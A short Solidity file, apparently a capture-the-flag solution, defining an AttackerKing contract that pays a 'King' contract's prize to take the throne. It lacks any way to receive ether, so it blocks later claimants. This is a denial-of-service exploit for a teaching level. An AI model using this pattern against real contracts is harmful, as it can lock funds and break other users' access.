// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/09_king.sol";

contract AttackerKing {
    function exploit(address king) public payable {
        (bool success, ) = payable(king).call{value: King(payable(king)).prize()}("");
        require(success, "Transfer failed!");
    }
}
